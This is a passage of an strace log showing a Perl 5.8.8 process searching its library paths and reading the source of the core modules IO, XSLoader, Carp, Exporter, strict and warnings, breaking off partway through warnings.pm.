7695  07:19:58.072578 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072591 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072604 stat64("/usr/lib/perl5/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072616 stat64("/usr/lib/perl5/IO.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072629 stat64("/usr/share/perl5/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072641 stat64("/usr/share/perl5/IO.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072653 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072666 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
7695  07:19:58.072687 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.072700 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.072711 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.072734 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
7695  07:19:58.072800 stat64("/etc/perl/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072813 stat64("/etc/perl/XSLoader.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072827 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072839 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072853 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072866 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072884 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072896 stat64("/usr/lib/perl5/XSLoader.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072909 stat64("/usr/share/perl5/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072921 stat64("/usr/share/perl5/XSLoader.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072934 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072946 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
7695  07:19:58.072967 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.072981 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.072992 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.073011 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
7695  07:19:58.073281 brk(0x8195000)    = 0x8195000
7695  07:19:58.073660 _llseek(8, 3407, [3407], SEEK_SET) = 0
7695  07:19:58.073679 _llseek(8, 0, [3407], SEEK_CUR) = 0
7695  07:19:58.073690 close(8)          = 0
7695  07:19:58.073819 stat64("/etc/perl/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073835 stat64("/etc/perl/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073849 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073862 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073876 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073889 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073902 stat64("/usr/lib/perl5/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073914 stat64("/usr/lib/perl5/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073927 stat64("/usr/share/perl5/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073939 stat64("/usr/share/perl5/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073952 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073964 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073978 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.073991 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
7695  07:19:58.074011 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.074026 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.074037 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.074055 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
7695  07:19:58.074496 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
7695  07:19:58.074523 read(8, "", 4096) = 0
7695  07:19:58.074535 close(8)          = 0
7695  07:19:58.074557 stat64("/etc/perl/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074571 stat64("/etc/perl/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074585 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074597 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074611 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074624 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074638 stat64("/usr/lib/perl5/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074650 stat64("/usr/lib/perl5/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074663 stat64("/usr/share/perl5/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074675 stat64("/usr/share/perl5/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074688 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074704 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074718 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.074731 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
7695  07:19:58.074752 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.074767 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.074778 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.074795 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
7695  07:19:58.075286 _llseek(8, 2217, [2217], SEEK_SET) = 0
7695  07:19:58.075303 _llseek(8, 0, [2217], SEEK_CUR) = 0
7695  07:19:58.075347 close(8)          = 0
7695  07:19:58.075452 stat64("/etc/perl/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075468 stat64("/etc/perl/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075481 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075494 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075507 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075519 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075533 stat64("/usr/lib/perl5/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075544 stat64("/usr/lib/perl5/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075561 stat64("/usr/share/perl5/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075572 stat64("/usr/share/perl5/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075585 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075597 stat64("/usr/lib/perl/5.8/strict.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075610 stat64("/usr/share/perl/5.8/strict.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.075622 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
7695  07:19:58.075643 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.075657 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.075668 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.075687 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
7695  07:19:58.075909 _llseek(8, 598, [598], SEEK_SET) = 0
7695  07:19:58.075924 _llseek(8, 0, [598], SEEK_CUR) = 0
7695  07:19:58.075947 close(8)          = 0
7695  07:19:58.075985 stat64("/etc/perl/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076000 stat64("/etc/perl/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076013 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076025 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076039 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076051 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076065 stat64("/usr/lib/perl5/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076076 stat64("/usr/lib/perl5/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076089 stat64("/usr/share/perl5/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076101 stat64("/usr/share/perl5/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076113 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076125 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076139 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.076151 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
7695  07:19:58.076171 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.076185 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.076196 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.076213 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> 